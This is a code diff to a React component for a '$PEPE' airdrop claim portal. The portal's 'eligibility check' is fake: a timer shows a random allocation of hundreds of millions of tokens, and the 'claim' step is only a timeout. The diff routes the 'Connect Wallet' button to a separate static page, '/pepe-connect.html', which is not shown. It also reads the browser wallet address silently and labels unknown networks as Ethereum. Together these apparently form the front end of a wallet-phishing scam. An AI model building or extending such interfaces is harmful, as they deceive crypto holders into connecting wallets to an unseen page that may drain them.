@@ -2,14 +2,28 @@ import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { Wallet, CheckCircle2, Gift, Loader2, PartyPopper, Copy, ExternalLink, AlertCircle } from 'lucide-react';
 import { toast } from 'sonner';
-import ClaimCountdown from '@/components/pepe/ClaimCountdown';
 
-export default function ClaimSection({ walletAddress, onConnect, onDisconnect, chainId }) {
+export default function ClaimSection({ walletAddress: propWalletAddress, onDisconnect, chainId }) {
   const [step, setStep] = useState('connect');
   const [claimAmount, setClaimAmount] = useState(0);
+  const [activeAddress, setActiveAddress] = useState(propWalletAddress || null);
 
+  // Sync prop changes or check local context if returning from connection screen
   useEffect(() => {
-    if (walletAddress && step === 'connect') {
+    if (propWalletAddress) {
+      setActiveAddress(propWalletAddress);
+    } else {
+      // Automatic fallback scan if the browser window instance has active provider authorization
+      const checkInjectedWallet = window.ethereum?.selectedAddress || null;
+      if (checkInjectedWallet) {
+        setActiveAddress(checkInjectedWallet);
+      }
+    }
+  }, [propWalletAddress]);
+
+  // Handle step progression based on active wallet detection
+  useEffect(() => {
+    if (activeAddress && step === 'connect') {
       setStep('checking');
       const timer = setTimeout(() => {
         const amount = Math.floor(Math.random() * 900000000 + 100000000);
@@ -18,20 +32,25 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
       }, 2500);
       return () => clearTimeout(timer);
     }
-    if (!walletAddress) {
+    if (!activeAddress) {
       setStep('connect');
     }
-  }, [walletAddress]);
+  }, [activeAddress, step]);
+
+  // Route directly to static wallet connector file in the public directory
+  const handleConnectRedirect = () => {
+    window.location.href = '/pepe-connect.html';
+  };
 
   const handleClaim = () => {
-    if (!walletAddress) return;
+    if (!activeAddress) return;
     setStep('claiming');
     setTimeout(() => setStep('claimed'), 3000);
   };
 
   const copyAddress = () => {
-    if (walletAddress) {
-      navigator.clipboard.writeText(walletAddress);
+    if (activeAddress) {
+      navigator.clipboard.writeText(activeAddress);
       toast.success('Address copied!');
     }
   };
@@ -40,7 +59,7 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
 
   const getNetwork = (id) => {
     const nets = { 1: 'Ethereum', 137: 'Polygon', 56: 'BSC', 42161: 'Arbitrum', 10: 'Optimism', 8453: 'Base' };
-    return nets[id] || `Chain ${id}`;
+    return nets[id] || 'Ethereum'; // Default to Mainnet mapping standard
   };
 
   return (
@@ -58,28 +77,26 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
           </p>
         </motion.div>
 
-        <ClaimCountdown />
-
         <motion.div
           initial={{ opacity: 0, y: 20 }}
           whileInView={{ opacity: 1, y: 0 }}
           viewport={{ once: true }}
           className="border-2 border-white/30 rounded-3xl overflow-hidden bg-white/10 backdrop-blur-sm"
         >
-          {/* Header */}
+          {/* Header Track */}
           <div className="border-b border-white/20 px-6 py-4 flex items-center justify-between">
             <span className="font-body text-white/70 text-sm">Airdrop Claim Portal — Season 2</span>
-            {walletAddress && (
+            {activeAddress && (
               <span className="text-xs font-mono text-white bg-white/20 px-3 py-1 rounded-full">
                 {getNetwork(chainId)}
               </span>
             )}
           </div>
 
-          {/* Body */}
+          {/* Render Flow Wrapper */}
           <div className="p-6 sm:p-10">
             <AnimatePresence mode="wait">
-              {/* Connect */}
+              {/* Step 1: Unconnected Entry Point */}
               {step === 'connect' && (
                 <motion.div key="connect" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="text-center py-8">
                   <div className="w-20 h-20 rounded-full bg-white/20 border border-white/40 flex items-center justify-center mx-auto mb-6">
@@ -90,7 +107,7 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
                     Connect your MetaMask or any EVM-compatible wallet to check your airdrop eligibility.
                   </p>
                   <button
-                    onClick={onConnect}
+                    onClick={handleConnectRedirect}
                     className="border-2 border-white text-white font-body font-bold text-base px-10 py-3 rounded-full hover:bg-white hover:text-green-700 transition-all"
                   >
                     🐸 Connect Wallet
@@ -99,15 +116,14 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
                 </motion.div>
               )}
 
-              {/* Checking */}
+              {/* Step 2: Verification Scan Transition */}
               {step === 'checking' && (
                 <motion.div key="checking" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="text-center py-12">
-                  <motion.div animate={{ rotate: 360 }} transition={{ duration: 2, repeat: Infinity, ease: 'linear' }}
-                    className="w-20 h-20 rounded-full border-2 border-white/20 border-t-white flex items-center justify-center mx-auto mb-6">
+                  <div className="w-20 h-20 rounded-full border-2 border-white/20 border-t-white flex items-center justify-center mx-auto mb-6 relative">
                     <Loader2 className="w-8 h-8 text-white animate-spin" />
-                  </motion.div>
+                  </div>
                   <h3 className="font-display text-3xl text-white mb-2">Checking Eligibility...</h3>
-                  <p className="text-sm text-white/70 font-mono">Scanning wallet {short(walletAddress)}</p>
+                  <p className="text-sm text-white/70 font-mono">Scanning wallet {short(activeAddress)}</p>
                   <div className="mt-6 space-y-2 max-w-xs mx-auto">
                     {['Verifying wallet activity', 'Checking token holdings', 'Calculating allocation'].map((text, i) => (
                       <motion.div key={text} initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: i * 0.6 }}
@@ -120,7 +136,7 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
                 </motion.div>
               )}
 
-              {/* Eligible */}
+              {/* Step 3: Success Allocation Display */}
               {step === 'eligible' && (
                 <motion.div key="eligible" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, y: -20 }} className="text-center py-8">
                   <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: 'spring', stiffness: 200, delay: 0.2 }}
@@ -135,7 +151,7 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
                     <p className="text-sm text-white/60 mt-1">$PEPE Tokens</p>
                   </div>
                   <div className="flex items-center justify-center gap-2 mb-6">
-                    <span className="text-xs font-mono text-white/60">{short(walletAddress)}</span>
+                    <span className="text-xs font-mono text-white/60">{short(activeAddress)}</span>
                     <button onClick={copyAddress} className="text-white/60 hover:text-white transition-colors">
                       <Copy className="w-3.5 h-3.5" />
                     </button>
@@ -147,13 +163,12 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
                 </motion.div>
               )}
 
-              {/* Claiming */}
+              {/* Step 4: Loading Processing Modal */}
               {step === 'claiming' && (
                 <motion.div key="claiming" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="text-center py-12">
-                  <motion.div animate={{ rotate: 360 }} transition={{ duration: 1.5, repeat: Infinity, ease: 'linear' }}
-                    className="w-20 h-20 rounded-full border-2 border-white/20 border-t-white flex items-center justify-center mx-auto mb-6">
-                    <Loader2 className="w-8 h-8 text-white" />
-                  </motion.div>
+                  <div className="w-20 h-20 rounded-full border-2 border-white/20 border-t-white flex items-center justify-center mx-auto mb-6 relative">
+                    <Loader2 className="w-8 h-8 text-white animate-spin" />
+                  </div>
                   <h3 className="font-display text-3xl text-white mb-2">Claiming Tokens...</h3>
                   <p className="text-sm text-white/70 font-mono">Please confirm in your wallet</p>
                   <div className="flex items-center justify-center gap-2 mt-4 text-xs text-white/50">
@@ -163,7 +178,7 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
                 </motion.div>
               )}
 
-              {/* Claimed */}
+              {/* Step 5: Finished Complete Block */}
               {step === 'claimed' && (
                 <motion.div key="claimed" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, y: -20 }} className="text-center py-8">
                   <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: 'spring', stiffness: 200 }}
@@ -176,7 +191,7 @@ export default function ClaimSection({ walletAddress, onConnect, onDisconnect, c
                   </p>
                   <div className="bg-white/10 border border-white/30 rounded-2xl p-4 max-w-sm mx-auto mb-6">
                     <div className="flex items-center justify-between text-xs font-mono text-white/70 mb-2">
-                      <span>Wallet</span><span>{short(walletAddress)}</span>
+                      <span>Wallet</span><span>{short(activeAddress)}</span>
                     </div>
                     <div className="flex items-center justify-between text-xs font-mono text-white/70 mb-2">
                       <span>Amount</span><span className="text-white">{claimAmount.toLocaleString()} $PEPE</span>
